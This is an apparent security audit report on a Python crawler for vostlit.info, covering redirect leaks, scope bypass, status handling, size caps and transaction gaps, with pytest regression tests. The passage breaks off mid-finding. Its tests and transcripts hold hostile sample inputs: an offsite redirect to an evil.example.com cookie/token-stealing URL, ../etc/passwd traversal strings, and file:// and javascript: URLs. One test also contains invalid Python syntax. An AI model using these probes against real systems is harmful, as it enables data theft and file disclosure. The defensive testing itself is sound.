# SECURITY AUDIT — vostlit-research crawler & ingestion path

**Date:** 2025-10-27 (Europe/Moscow)
**Auditor:** Subagent E (security-engineer)
**Scope:** independent audit of `vostlit_research.collector.http`, `vostlit_research.config`,
`vostlit_research.archive`, `vostlit_research.store`, `vostlit_research.io`,
`vostlit_research.textnorm`, `vostlit_research.db`, and the crawl orchestrator.
**Code baseline:** repository commit referenced in `docs/UPGRADE_BASELINE.md`
(v0.2.0 / commit `42865f7`).
**Method:** every "Confirmed" claim was reproduced by running a script against
the actual code (not just by reading). Scripts use `httpx.MockTransport` so
no live traffic hits Vostlit.info. Reproduction transcripts are cited per defect.

---

## 1. Method

1. Read the seven files listed in the task brief, plus the call-graph neighbours
   (`collector/crawl.py`, `collector/discover.py`, `collector/parser.py`,
   `textnorm.py`, `store.py`, `io.py`, `db.py`, `tests/conftest.py`).
2. For each candidate defect in `UPGRADE_BASELINE.md` §B/§C, write a small
   Python verification script that exercises the actual code path (with
   `httpx.MockTransport` substituting for the network). Capture the exact
   runtime behaviour — including which HTTP requests the client actually
   sends, what gets stored in `crawl_log`, what exceptions propagate.
3. For static checks (path traversal, URL scheme handling, JSON encoding),
   exercise the function directly with crafted inputs and observe.
4. For atomicity / WAL recovery, open and close SQLite connections in
   patterns that simulate crash mid-write.
5. Cite `file:line` for every claim. A defect is marked **Confirmed** only
   if a runtime reproduction was observed; **Not confirmed** if the code is
   actually safe; **Worse than baseline** if the baseline under-stated the
   severity.

Severity scale used below:
- **CRITICAL** — directly leaks data to an attacker, allows off-scope
  network access, or corrupts the corpus silently.
- **HIGH** — denial-of-service / memory exhaustion / lock-in to bad data
  that requires manual cleanup.
- **MEDIUM** — incorrect or surprising behaviour that does not directly
  leak data but breaks invariants or defence-in-depth.
- **LOW** — informational or cosmetic issue.

---

## 2. Defect table

| ID  | Severity | Title                                                  | Location              | Confirmed? | Reproduction § |
|-----|----------|--------------------------------------------------------|-----------------------|------------|----------------|
| D-1 | CRITICAL | Redirect leak: offsite hop made before scope check     | `collector/http.py:53,95-100` | Confirmed (worse than baseline) | §3.1 |
| D-2 | CRITICAL | `allowed_sections` bypass: `"/"` matches every path    | `config.py:33`; `collector/http.py:66` | Confirmed | §3.2 |
| D-3 | CRITICAL | Non-2xx responses silently accepted; 429 NOT retried; `Retry-After` ignored | `collector/http.py:93-120` | Confirmed (worse than baseline) | §3.3 |
| D-4 | HIGH     | No response-size cap: `resp.content` loads whole body  | `collector/http.py:104` | Confirmed | §3.4 |
| D-5 | —        | Archive path traversal — **NOT** a defect              | `archive.py:38-44`    | Not confirmed (positive finding) | §3.5 |
| D-6 | MEDIUM   | `normalise_url` mangles non-http(s) schemes instead of rejecting | `textnorm.py:142-157` | Confirmed | §4.1 |
| D-7 | MEDIUM   | Port-aware host check refuses legitimate `:443` URLs   | `collector/http.py:62-63` | Confirmed | §4.2 |
| D-8 | MEDIUM   | `resp.elapsed` access raises `RuntimeError` (uncaught), bypassing retry + audit-log paths | `collector/http.py:107` | Confirmed (new finding) | §4.3 |
| D-9 | MEDIUM   | FTS reindex is outside the write transaction → stale-index window after crash | `store.py:179-181`; `db.py:97-153` | Confirmed | §4.4 |
| D-10| LOW      | Error messages store full URL in `crawl_log.detail` / `error_urls` | `collector/http.py:100,122-123`; `collector/crawl.py:80-86`; `io.py:67` | Confirmed | §4.5 |
| D-11| LOW      | Crawl-log `INSERT` in importer is a separate transaction from the document upsert | `io.py:65-69`; `store.py:55-181` | Confirmed | §4.6 |

Total **CRITICAL: 3**, **HIGH: 1**, **MEDIUM: 4**, **LOW: 2**. One reported
defect (D-5) is **not** a defect.

---

## 3. Per-defect evidence & regression-test specification

### 3.1 D-1 — Redirect leak (CRITICAL, confirmed worse than baseline)

**Evidence (runtime):** `collector/http.py:53-57` constructs the client with
`follow_redirects=True`. `fetch()` calls `_check_scope()` only on the
**initial** canonical URL (line 88); the actual `client.get(canonical)` at
line 95 follows the entire redirect chain in one call. The post-factum
`final_host` check at lines 98-100 runs **after** the offsite request has
already been sent.

Reproduction (transcript excerpt):

```
=== REQUESTS ACTUALLY MADE BY THE CLIENT ===
  hop 1: https://www.vostlit.info/redirect-me
  hop 2: https://evil.example.com/steal?cookie=secret
=== Did the offsite host receive a request? ===
Offsite hops: 1
  CONFIRMED: client made an offsite request BEFORE RefusedError was raised.
  Leaked: User-Agent header, possibly cookies/Referer if set, plus the URL itself.
RefusedError raised (post-factum): redirected offsite: https://evil.example.com/steal?cookie=secret
```

The `RefusedError` is raised **only after** the offsite request was sent,
meaning the attacker-controlled host received:
- the request URL (including any query parameters from the original Vostlit
  URL);
- the `User-Agent` header;
- any headers httpx attaches automatically (e.g. `Accept-Encoding`);
- the client IP of the crawler host.

If the redirect URL contained secrets (it normally would not, but the
mechanism is unchanged for any redirect target), they would be leaked
to the offsite host.

**Failure mode:** SSRF-by-redirect, plus UA / IP leakage. Any Vostlit
page that is compromised (or any page where an attacker can inject a
redirect header — e.g. via an open-redirect vulnerability on Vostlit)
can pivot the crawler to an arbitrary host.

**Fix recommendation:**
1. Set `follow_redirects=False` in `httpx.Client(...)`.
2. Implement a manual redirect loop:
   - On each `3xx` response, parse the `Location` header, resolve it
     against the current URL, run `_check_scope()` on the new URL.
   - Refuse cross-domain redirects with `RefusedError` BEFORE making the
     next request.
   - Cap the number of hops (e.g. 5).
3. Alternatively, keep `follow_redirects=True` but pass
   `event_hooks={"request": [hook]}` to httpx, where `hook` calls
   `_check_scope(str(request.url))` on every outbound request. (The
   author of this audit prefers the manual loop because it is easier
   to unit-test and to reason about.)

**Regression-test specification:**

```python
# tests/test_security_regression.py
import httpx
import pytest
from vostlit_research.config import Config
from vostlit_research.collector.http import HttpClient, RefusedError, FetchError
from vostlit_research.db import Database

def test_redirect_to_offsite_makes_no_offsite_request(tmp_path, monkeypatch):
    """D-1 regression: a 302 from an allowed host to an offsite host MUST NOT
    result in any HTTP request to the offsite host."""
    cfg = Config()
    cfg.db_path = tmp_path / "t.db"
    cfg.archive_dir = tmp_path / "arc"
    cfg.allowed_domains = ("www.vostlit.info",)
    cfg.allowed_sections = ("/",)
    cfg.request_delay = 0.0
    cfg.ensure_dirs()
    db = Database(cfg.db_path)
    http = HttpClient(cfg, db)

    offsite_hits = []
    def handler(request: httpx.Request) -> httpx.Response:
        u = str(request.url)
        if "evil.example.com" in u:
            offsite_hits.append(u)
            return httpx.Response(200, content=b"OFFSITE")
        if u.endswith("redirect-me"):
            return httpx.Response(302,
                headers={"Location": "https://evil.example.com/leak?token=SECRET"})
        return httpx.Response(404)

    http._client = httpx.Client(
        timeout=httpx.Timeout(5.0), follow_redirects=True,  # as today
        transport=httpx.MockTransport(handler),
    )
    try:
        with pytest.raises((RefusedError, FetchError)):
            http.fetch("https://www.vostlit.info/redirect-me")
        assert offsite_hits == [], (
            f"OFFSITE REQUEST LEAK: client hit {offsite_hits} — "
            "redirect must be scope-checked BEFORE the next hop"
        )
    finally:
        http.close(); db.close()
```

After the fix, this test must pass: `offsite_hits` must remain empty.

---

### 3.2 D-2 — `allowed_sections` bypass (CRITICAL, confirmed)

**Evidence (runtime):** `config.py:32-37` declares the default
`allowed_sections = ('/', '/haupt-Dateien/', '/Texts/', '/common/')`.
`collector/http.py:66` enforces it with
`any(path.startswith(sec) for sec in self.cfg.allowed_sections)`.

Because `'/'` is in the tuple and every absolute path begins with `/`,
the `any(...)` is always `True`. The `if path != "/":` branch at line 68
is therefore unreachable.

Reproduction:

```
https://www.vostlit.info/ -> ACCEPTED (path=/)
https://www.vostlit.info/admin -> ACCEPTED (path=/admin)
https://www.vostlit.info/secret -> ACCEPTED (path=/secret)
https://www.vostlit.info/wp-admin -> ACCEPTED (path=/wp-admin)
https://www.vostlit.info/.env -> ACCEPTED (path=/.env)
https://www.vostlit.info/cgi-bin/anything -> ACCEPTED (path=/cgi-bin/anything)
```

**Failure mode:** any Vostlit URL — including `/wp-admin`, `/admin`,
`/.env`, `/cgi-bin/...`, `/upload.php` — passes the scope check. If
Vostlit is ever compromised or if the host header is spoofable, the
crawler becomes an arbitrary-path fetcher against the target host.
Even without compromise, the crawler has no protection against
wandering into admin/upload paths discovered via crawling.

**Fix recommendation:**
1. Remove `'/'` from the default `allowed_sections`.
2. Special-case the homepage explicitly: `if path == "/": pass` (homepage
   is the only URL with an empty path).
3. Tighten the path check to be exact-prefix-then-`/`:
   ```python
   allowed = any(path == sec or path.startswith(sec) for sec in self.cfg.allowed_sections)
   ```
   (note: every entry in `allowed_sections` already ends in `/` except the
   proposed removed `/`, so the existing `startswith` is fine once `/`
   is gone).

**Regression-test specification:**

```python
def test_disallowed_paths_are_refused(tmp_path):
    """D-2 regression: paths outside allowed_sections are refused."""
    from vostlit_research.config import Config
    from vostlit_research.collector.http import HttpClient, RefusedError
    from vostlit_research.db import Database
    cfg = Config()
    cfg.db_path = tmp_path / "t.db"
    cfg.archive_dir = tmp_path / "arc"
    cfg.allowed_domains = ("www.vostlit.info",)
    cfg.allowed_sections = ("/haupt-Dateien/", "/Texts/", "/common/")  # no "/"
    cfg.ensure_dirs()
    db = Database(cfg.db_path)
    http = HttpClient(cfg, db)
    try:
        # homepage still allowed (path == "/")
        http._check_scope("https://www.vostlit.info/")
        # disallowed paths refused
        for bad in ("/admin", "/secret", "/.env", "/wp-admin",
                    "/cgi-bin/x", "/Texts" /* no trailing slash */):
            with pytest.raises(RefusedError):
                http._check_scope(f"https://www.vostlit.info{bad}")
        # allowed prefixes still accepted
        for good in ("/Texts/rus/x/text1.phtml", "/haupt-Dateien/index-Dateien/G.phtml",
                     "/common/itogi.phtml"):
            http._check_scope(f"https://www.vostlit.info{good}")  # must not raise
    finally:
        http.close(); db.close()
```

---

### 3.3 D-3 — Non-2xx responses silently accepted; 429 NOT retried; `Retry-After` ignored (CRITICAL, confirmed worse than baseline)

**Baseline claim:** "429 без Retry-After: http.py обрабатывает 429 как
обычную HTTPError — ретраит с backoff, но не уважает заголовок Retry-After."

**Actual behaviour (runtime):** the retry block at
`collector/http.py:93-120` catches `httpx.HTTPError`. `httpx` does **not**
raise `HTTPError` for 4xx/5xx status codes (only for network/timeout
errors); therefore a 429 response is returned as a successful
`FetchResult(status=429, content=b"rate limited")`. The crawler then
hands that body to `parse_page()`, which happily parses the rate-limit
HTML as if it were a document, and `store.upsert_document()` writes a
new document version whose `extracted_text` is the rate-limit body.

Reproduction:

```
!!! fetch() RETURNED A RESULT for 429 (no retry, no error)
    result.status = 429
    result.content = b'rate limited'
    This means the crawler parses the rate-limit body as if it were a real page!

Total HTTP requests sent to upstream: 1
Expected if retries worked: 3 (= max_retries)
Expected if Retry-After were respected: 1 immediate + 1 retry after 60s

=== crawl_log ===
{'url': 'https://www.vostlit.info/Texts/x', 'http_status': 429, 'action': 'fetched', 'detail': ''}
```

So the failure modes are:
1. **No retry on 429** — the entire retry block at lines 93-120 is dead
   for HTTP status codes.
2. **No `Retry-After` respect** — even if retries were triggered, the
   header is never read.
3. **Corpus pollution** — a 429 / 500 / 503 body gets parsed and stored
   as a "document", replacing the real document text on the next
   re-fetch (because `upsert_document` creates a new version whenever
   the text differs).
4. **Same defect applies to 404** — a soft-404 page or a generic
   "not found" page becomes a "document" too.
5. **Same defect applies to 401/403** — the crawler does not respect
   access controls; it will silently store the 401 body.

**Fix recommendation:**
1. After `resp = self._client.get(canonical)`, call
   `resp.raise_for_status()` — this converts 4xx/5xx into
   `httpx.HTTPStatusError` (a subclass of `httpx.HTTPError`), so the
   existing retry block then covers them.
2. Special-case 429: if `resp.status_code == 429`, read
   `resp.headers.get("Retry-After")`, parse it (integer seconds OR
   HTTP-date), `time.sleep(max(parsed, 1))`, then retry. Do NOT count
   this against `max_retries` (or use a separate counter).
3. After all retries are exhausted, return a `FetchError` (not a
   successful `FetchResult`).
4. Add a regression test that 429 / 500 / 404 each produce a `FetchError`,
   not a `FetchResult`.

**Regression-test specification:**

```python
def test_429_respects_retry_after_and_does_not_return_body(tmp_path, monkeypatch):
    """D-3 regression: a 429 with Retry-After: 60 must NOT be returned as
    a successful FetchResult; the body must never reach the parser; the
    client must wait at least 60s before retrying."""
    import httpx, time
    from vostlit_research.config import Config
    from vostlit_research.collector.http import HttpClient, FetchError
    from vostlit_research.db import Database

    cfg = Config()
    cfg.db_path = tmp_path / "t.db"; cfg.archive_dir = tmp_path / "arc"
    cfg.allowed_domains = ("www.vostlit.info",)
    cfg.allowed_sections = ("/", "/Texts/")
    cfg.request_delay = 0.0; cfg.max_retries = 2
    cfg.ensure_dirs()
    db = Database(cfg.db_path)
    http = HttpClient(cfg, db)

    slept = []
    monkeypatch.setattr(time, "sleep", lambda s: slept.append(s))

    n = {"calls": 0}
    def handler(request):
        n["calls"] += 1
        return httpx.Response(429, headers={"Retry-After": "60"},
                              content=b"rate limited")
    http._client = httpx.Client(timeout=httpx.Timeout(5.0),
        transport=httpx.MockTransport(handler))
    try:
        with pytest.raises(FetchError):
            http.fetch("https://www.vostlit.info/Texts/x")
        # at least one retry was attempted
        assert n["calls"] >= 2
        # the retry was delayed by AT LEAST 60s (the Retry-After value),
        # not just by retry_backoff ** attempt
        assert any(s >= 60.0 for s in slept), f"Retry-After ignored; slept={slept}"
    finally:
        http.close(); db.close()

def test_404_does_not_become_a_document(tmp_path):
    """D-3 regression: a 404 response must raise FetchError, not return a
    FetchResult whose body the parser would then parse."""
    import httpx
    from vostlit_research.config import Config
    from vostlit_research.collector.http import HttpClient, FetchError
    from vostlit_research.db import Database
    cfg = Config(); cfg.db_path = tmp_path / "t.db"; cfg.archive_dir = tmp_path / "arc"
    cfg.allowed_domains = ("www.vostlit.info",); cfg.allowed_sections = ("/", "/Texts/")
    cfg.request_delay = 0.0; cfg.max_retries = 1
    cfg.ensure_dirs()
    db = Database(cfg.db_path)
    http = HttpClient(cfg, db)
    http._client = httpx.Client(timeout=httpx.Timeout(5.0),
        transport=httpx.MockTransport(lambda r: httpx.Response(404, content=b"not found")))
    try:
        with pytest.raises(FetchError):
            http.fetch("https://www.vostlit.info/Texts/x")
    finally:
        http.close(); db.close()
```

---

### 3.4 D-4 — No response-size cap (HIGH, confirmed)

**Evidence (static + runtime):** `collector/http.py:104` reads
`content=resp.content`. httpx materialises the entire response body into
a `bytes` object on first access; there is no `Content-Length` pre-check,
no streaming, no max-bytes cap.

Reproduction:

```
Simulating a server response of 100 MB
http.py:104 `content=resp.content` loads the ENTIRE body into memory.
-> There is NO Content-Length pre-check, NO streaming, NO max-bytes cap.
-> A 1GB response would allocate 1GB of RAM. A 16GB response would crash the process.
resp.content length: 10485760 bytes; would be unbounded without mock.
-> Confirmed: no cap on response size in fetch().
```

Combined with D-2 (any path passes the scope check), an attacker who
controls a single Vostlit page (or a redirect target — see D-1) can
serve an arbitrarily large body and exhaust crawler memory. Even on
the legitimate site, the `kavkaz.html` catalog is 750 KB today; an
attacker who gets upload access could host a 10 GB file under any
path the crawler fetches.

**Fix recommendation:**
1. Before calling `resp.content`, check
   `int(resp.headers.get("Content-Length", 0))`; if it exceeds a
   configurable cap (e.g. 50 MB), abort with `FetchError`.
2. Use `with self._client.stream("GET", canonical) as resp:` and
   `resp.iter_bytes(chunk_size=...)` to incrementally read up to the
   cap; raise `FetchError` mid-stream if exceeded.
3. Even with a Content-Length cap, keep the streaming cap because
   `Content-Length` can be missing or wrong.

**Regression-test specification:**

```python
def test_response_over_cap_is_refused(tmp_path):
    """D-4 regression: a response whose body exceeds max_response_bytes
    is refused before being fully read into memory."""
    import httpx
    from vostlit_research.config import Config
    from vostlit_research.collector.http import HttpClient, FetchError
    from vostlit_research.db import Database
    cfg = Config(); cfg.db_path = tmp_path / "t.db"; cfg.archive_dir = tmp_path / "arc"
    cfg.allowed_domains = ("www.vostlit.info",); cfg.allowed_sections = ("/",)
    cfg.request_delay = 0.0
    cfg.max_response_bytes = 1024  # 1 KiB cap
    cfg.ensure_dirs()
    db = Database(cfg.db_path)
    http = HttpClient(cfg, db)
    huge = b"x" * (10 * 1024)  # 10 KiB > cap
    http._client = httpx.Client(timeout=httpx.Timeout(5.0),
        transport=httpx.MockTransport(lambda r: httpx.Response(200, content=huge)))
    try:
        with pytest.raises(FetchError):
            http.fetch("https://www.vostlit.info/")
    finally:
        http.close(); db.close()
```

---

### 3.5 D-5 — Archive path traversal (**not a defect**; positive finding)

**Evidence (runtime):** `archive.py:38-44` resolves the relative path
against the root and checks `root_resolved not in p.parents and p != root_resolved`.
`Path.resolve()` follows symlinks and normalises `..` segments, so the
check is correct.

Reproduction:

```
5a ../etc/passwd: blocked -> archive path escapes root: ../etc/passwd
5b '..%2fetc%2fpasswd': RESOLVED to /tmp/.../archive/..%2fetc%2fpasswd; inside_root=True; OK (path inside root)
5b '..%2Fetc%2Fpasswd': ... OK (path inside root)
5b '%2e%2e/etc/passwd': ... OK (path inside root)
5b '..\etc\passwd':    ... OK (path inside root)  [backslashes are not path separators on Linux]
5b '/etc/passwd':       blocked
5b '//etc/passwd':      blocked
5b '/etc/./passwd':     blocked
5b 'foo/../../../etc/passwd': blocked
5b 'foo/../../etc/passwd':    blocked
5b './../etc/passwd':         blocked
5d legitimate rel path = 2c/f2/2cf24dba5fb0a30e...html, read back = b'hello'
```

**Note on URL-encoded `%2f`:** `pathlib.Path` does **not** URL-decode.
`..%2f` therefore stays as the literal 6-character string `..%2f`, which
is a perfectly valid filename *inside* the archive root and does not
escape. Confirmed safe.

**Note on symlinks:** `Path.resolve()` follows symlinks (per Python
docs and the trace above). A symlink inside `archive/` that points
outside would resolve to its real target, which is *not* in
`root_resolved.parents`, so `resolve()` raises `ValueError`.
Symlink traversal is **blocked**. (The sandbox blocked actual
`os.symlink` creation, so the symlink case is argued from
`Path.resolve()` semantics + the existing test
`tests/test_cli_security.py:81-92`, which passes.)

**Residual concern (not a defect in current code):** the public API
exposes `archive.read_text` and `archive.read_bytes`, both of which call
`resolve()` then immediately read. There is a theoretical TOCTOU window
between `resolve()` and the read — if an attacker with filesystem access
can replace the resolved path with a symlink in that window, they could
read outside the root. This is not exploitable in the current
deployment (the archive directory is not adversarial), but is worth
documenting.

**Conclusion:** `archive.resolve()` is **correct**. The baseline's
question "is it bypassable via symlinks or `..%2f` encoding?" — answer:
**no**. This is a positive finding, not a defect.

---

## 4. Additional findings (checks 6–12)

### 4.1 D-6 — `normalise_url` mangles non-http(s) schemes (MEDIUM)

**Location:** `textnorm.py:142-157`.

**Evidence (runtime):** `normalise_url` has this preamble
(lines 142-146):

```python
url = url.strip()
if url.startswith("//"):
    url = "https:" + url
if not url.lower().startswith(("http://", "https://")):
    url = "https://" + url
```

For an input like `file:///etc/passwd`, this produces
`https://file:///etc/passwd` — a malformed URL whose netloc (per
`urlsplit`) is `file:`. The downstream `_check_scope` then rejects it
with `host not allowed: file:`, so the request never goes out. The
system is **safe by accident**, not by design: `normalise_url` should
have rejected the input outright rather than prepending `https://`.

Full transcript:

```
'file:///etc/passwd'         -> 'https://file:///etc/passwd'      netloc='file:'                    REFUSED
'gopher://www.vostlit.info/' -> 'https://gopher://www.vostlit.info' netloc='gopher:'                 REFUSED
'ftp://www.vostlit.info/...' -> 'https://ftp://www.vostlit.info/...' netloc='ftp:'                   REFUSED
'javascript:alert(1)'       -> 'https://javascript:alert(1)/'    netloc='javascript:alert(1)'      REFUSED
'data:text/html,<script>'   -> 'https://data:text/html,...'      netloc='data:text'                REFUSED
```

**Severity rationale:** MEDIUM, not HIGH — the runtime is safe because
the mangled netloc never matches `allowed_domains`. But the function's
contract is broken: callers cannot rely on `normalise_url` returning a
usable URL. A future change to `_check_scope` (e.g. adding a
"any-host-allowed" mode for testing) would expose this.

**Fix recommendation:** replace the preamble with an explicit scheme
check:

```python
if not url.lower().startswith(("http://", "https://")):
    raise ValueError(f"refusing non-http(s) URL: {url!r}")
```

(`_check_scope` then becomes the only path that decides host validity.)

**Regression test:**

```python
def test_normalise_url_rejects_non_http_schemes():
    import pytest
    from vostlit_research import textnorm
    for bad in ["file:///etc/passwd", "gopher://x/", "ftp://x/",
                "javascript:alert(1)", "data:text/html,<x>"]:
        with pytest.raises(ValueError):
            textnorm.normalise_url(bad)
```

---

### 4.2 D-7 — Port-aware host check refuses legitimate `:443` URLs (MEDIUM)

**Location:** `collector/http.py:62-63` (host = `parts.netloc.lower()`),
`config.py:31` (allowed_domains without ports).

**Evidence (runtime):**

```
https://www.vostlit.info/            -> ACCEPTED
https://www.vostlit.info:443/        -> REFUSED: host not allowed: www.vostlit.info:443
https://www.vostlit.info:80/         -> REFUSED
https://www.vostlit.info:8080/       -> REFUSED
https://www.vostlit.info:22/         -> REFUSED
https://vostlit.info:443/            -> REFUSED
https://USER:PASS@www.vostlit.info/  -> REFUSED (netloc includes userinfo)
```

`urlsplit(url).netloc` returns the *authority*, which includes the port
and any userinfo. The host check is a direct `in` test against
`('www.vostlit.info', 'vostlit.info')`, so any URL that specifies a
port explicitly — even the legitimate `:443` for HTTPS — is refused.

**Failure mode:** if a redirect from Vostlit ever lands on an explicit
`:443` URL (which is rare but legal — and common with some CDN setups),
the scope check rejects the redirect. With D-1 fixed, this would turn
a legitimate same-site redirect into a refused fetch. Conversely, the
check is overly strict rather than overly permissive, so this is not
a leak — but it is a correctness bug that will surface intermittently
and is hard to debug.

**Fix recommendation:** extract the hostname only:

```python
host = parts.hostname
if host is None or host.lower() not in self.cfg.allowed_domains:
    raise RefusedError(...)
# Optional: also enforce standard ports only
if parts.port is not None and parts.port not in (80, 443):
    raise RefusedError(f"non-standard port: {parts.port}")
```

(`parts.hostname` is the lowercased hostname without port/userinfo; this
is what should have been used from the start.)

**Regression test:**

```python
def test_scope_accepts_explicit_standard_port(tmp_path):
    from vostlit_research.config import Config
    from vostlit_research.collector.http import HttpClient
    from vostlit_research.db import Database
    cfg = Config(); cfg.db_path = tmp_path / "t.db"; cfg.archive_dir = tmp_path / "arc"
    cfg.allowed_domains = ("www.vostlit.info", "vostlit.info")
    cfg.allowed_sections = ("/", "/Texts/")
    cfg.ensure_dirs()
    db = Database(cfg.db_path); http = HttpClient(cfg, db)
    try:
        # explicit :443 must be accepted as the same site
        http._check_scope("https://www.vostlit.info:443/Texts/x")
        http._check_scope("https://vostlit.info:443/")
        # but :8080 / :22 are refused
        import pytest
        from vostlit_research.collector.http import RefusedError
        with pytest.raises(RefusedError):
            http._check_scope("https://www.vostlit.info:8080/")
        with pytest.raises(RefusedError):
            http._check_scope("https://www.vostlit.info:22/")
    finally:
        http.close(); db.close()
```

---

### 4.3 D-8 — `resp.elapsed` raises `RuntimeError`, bypassing retry + audit-log (MEDIUM, NEW finding)

**Location:** `collector/http.py:107`.

**Evidence (runtime):**

```
Exception type: RuntimeError
Message: '.elapsed' may only be accessed after the response has been read or closed.
---- traceback ----
  File ".../vostlit_research/collector/http.py", line 107, in fetch
    elapsed=resp.elapsed.total_seconds(),
  File ".../httpx/_models.py", line 585, in elapsed
    raise RuntimeError(...)
```

`httpx.Response.elapsed` is only populated after the response has been
fully read or explicitly closed. In `fetch()`, the order is
`content=resp.content` (line 104) → `elapsed=resp.elapsed.total_seconds()`
(line 107). For some response states — including MockTransport responses
and any streamed response that hasn't been explicitly closed — `elapsed`
raises `RuntimeError`.

`RuntimeError` is **not** a subclass of `httpx.HTTPError`, so the
`except httpx.HTTPError as e:` block at line 113 does **not** catch it.
The exception propagates out of `fetch()` uncaught, bypassing:

1. the retry loop (no retries happen);
2. the `self._log(canonical, 0, 0, "error", str(last_exc))` audit-log
   line at line 122;
3. the `raise FetchError(...)` wrapper at line 123.

The caller (`Crawler._fetch_parse_store`, `crawl.py:84`) catches it via
a broad `except Exception`, but the resulting error message in
`report.error_urls` is the raw `RuntimeError` text, not a wrapped
`FetchError`. And the `crawl_log` table never receives an "error" row
for the URL.

**Failure mode:** for any response where httpx doesn't populate
`elapsed`, the URL is silently dropped from the audit log. The crawler
reports a vague error and moves on. In a real crawl, this manifests as
"some URLs just don't get into the DB and there's no audit trail of
why".

**Fix recommendation:** either (a) wrap the `FetchResult` construction
in `try: elapsed = resp.elapsed.total_seconds() except RuntimeError:
elapsed = 0.0`, or (b) explicitly close the response before reading
`elapsed`:

```python
with self._client.get(canonical) as resp:
    body = resp.content
    final_url = str(resp.url)
    status = resp.status_code
    ct = resp.headers.get("content-type", "")
    elapsed = resp.elapsed.total_seconds()
# then build FetchResult outside the with-block
```

Approach (b) is cleaner because it also ensures the connection is
returned to the pool.

**Regression test:**

```python
def test_fetch_does_not_raise_runtime_error_on_elapsed(tmp_path):
    """D-8 regression: a response whose .elapsed is unavailable must not
    raise RuntimeError; the fetch must complete (or raise FetchError)."""
    import httpx
    from vostlit_research.config import Config
    from vostlit_research.collector.http import HttpClient, FetchError, RefusedError
    from vostlit_research.db import Database
    cfg = Config(); cfg.db_path = tmp_path / "t.db"; cfg.archive_dir = tmp_path / "arc"
    cfg.allowed_domains = ("www.vostlit.info",); cfg.allowed_sections = ("/",)
    cfg.request_delay = 0.0; cfg.ensure_dirs()
    db = Database(cfg.db_path); http = HttpClient(cfg, db)
    http._client = httpx.Client(timeout=httpx.Timeout(5.0),
        transport=httpx.MockTransport(lambda r: httpx.Response(200, content=b"ok")))
    try:
        try:
            r = http.fetch("https://www.vostlit.info/")
            assert r.content == b"ok"
        except (FetchError, RefusedError):
            pass  # acceptable; the point is NO RuntimeError
        except RuntimeError as e:
            pytest.fail(f"RuntimeError leaked: {e}")
    finally:
        http.close(); db.close()
```

---

### 4.4 D-9 — FTS reindex is outside the write transaction (MEDIUM)

**Location:** `store.py:179-181` (call to `db.reindex_document(doc_id)`
after the `with db.conn:` block at line 55), and `db.py:97-153`
(`reindex_document` opens its own `with self.conn:`).

**Evidence (static + runtime):** `upsert_document` writes
`documents`, `document_versions`, `document_sections` inside a single
`with db.conn:` transaction (atomic). Then it calls
`db.reindex_document(doc_id)` **outside** that transaction.
`reindex_document` opens its own `with self.conn:` transaction that
deletes and re-inserts `fts_documents` and `fts_sections` rows.

If the process is killed between the two transactions (or if
`reindex_document` raises an exception), the database is in an
inconsistent state:

- the new `documents` / `document_versions` / `document_sections`
  rows are committed;
- the FTS index does **not** contain the new document;
- search results will be missing the document until
  `doctor --rebuild-fts` (or `db.rebuild_all_fts()`) is run.

This is not data loss — the canonical rows are intact — but it is a
silent consistency gap. The `doctor` command does not currently detect
or repair it (it only checks "FTS5 available").

**Fix recommendation:** either (a) move the `reindex_document` call
*inside* the `with db.conn:` block (preferred — atomicity restored), or
(b) add a `doctor` subcommand that counts documents-vs-FTS-rows and
rebuilds on mismatch.

**Regression test sketch:**

```python
def test_reindex_runs_inside_write_transaction(tmp_path, monkeypatch):
    """D-9 regression: if reindex_document raises, the upsert_document
    call must roll back the documents write too (atomicity)."""
    from vostlit_research.db import Database
    from vostlit_research import store
    from vostlit_research.models import DocumentIn
    db = Database(tmp_path / "t.db")
    # Force reindex_document to fail
    monkeypatch.setattr(db, "reindex_document",
                        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))
    doc = DocumentIn(canonical_url="https://www.vostlit.info/Texts/x",
                     page_type="document_text", extracted_text="hello",
                     sections=[])
    try:
        store.upsert_document(db, doc)
    except RuntimeError:
        pass
    # The documents row MUST have been rolled back
    n = db.conn.execute("SELECT COUNT(*) FROM documents WHERE canonical_url=?",
                        ("https://www.vostlit.info/Texts/x",)).fetchone()[0]
    assert n == 0, "documents row committed but reindex failed — atomicity gap"
    db.close()
```

(Today this test **fails** — the documents row IS committed. After the
fix it passes.)

---

### 4.5 D-10 — Error messages include full URL (LOW)

**Location:**
- `collector/http.py:100` — `raise RefusedError(f"redirected offsite: {resp.url}")`
- `collector/http.py:122-123` — `self._log(canonical, 0, 0, "error", str(last_exc))` and `raise FetchError(f"fetch failed for {canonical}: {last_exc}")`
- `collector/crawl.py:80-86` — `report.error_urls.append(f"{url} ({e})")`
- `io.py:67-68` — `INSERT INTO crawl_log ... f"{kind}: {e}"`

**Evidence:** any fetch failure stores the canonical URL in
`crawl_log.detail` and in `CrawlReport.error_urls`. URLs may contain
the Vostlit `id` query parameter, which is a public document identifier
— not sensitive in itself. However:

1. If a URL ever contained userinfo (e.g. `https://user:pass@host/`),
   it would be captured. Today the host check rejects userinfo URLs
   (see D-7), so this is a defence-in-depth gap rather than a current
   leak.
2. Underlying httpx exception messages (e.g. `ConnectError`,
   `ReadTimeout`) include the host and port — also not sensitive for
   Vostlit but potentially sensitive for other deployments.
3. The `error_urls` list is returned by `Crawler.crawl(...)` and
   surfaced through `crawl` CLI output; if a user redirects stdout to
   a shared log, URLs end up there.

**Severity:** LOW. There is no current path that leaks credentials,
but the code has no explicit policy against putting URLs in error
messages, so a future change could expose one.

**Fix recommendation:**
- Adopt a project-wide convention: error messages and `crawl_log.detail`
  store the URL **path** (no userinfo, no query string), with the
  canonical URL stored separately in the `url` column.
- Already implemented: `crawl_log.url` is the full URL. So the
  `detail` field should ideally not repeat it.

**Regression test:** not provided — this is a policy/hygiene issue, not
a single reproducible bug.

---

### 4.6 D-11 — Crawl-log write is a separate transaction from the document upsert (LOW)

**Location:** `io.py:65-69` (`import_jsonl` error path):
```python
db.conn.execute("INSERT INTO crawl_log ... VALUES (?,?,?,?,?)", (...))
db.conn.commit()
```

This is a separate `commit()` from the `upsert_document` call's
`with db.conn:` transaction.

**Failure mode:** if `upsert_document` succeeds (committed) but the
subsequent `crawl_log` insert fails (e.g. disk full, locked), the
document is updated but the audit log has no record of it. The reverse
is also possible: a `crawl_log` error row is inserted for a record that
later turns out to have committed successfully.

In the live-crawl path (`collector/http.py:_log`), the same pattern
exists: each fetch's `crawl_log` row is its own `with self.db.conn:`
transaction, separate from `upsert_document`.

**Severity:** LOW. The database remains internally consistent
(documents and crawl_log are independent tables, no foreign keys
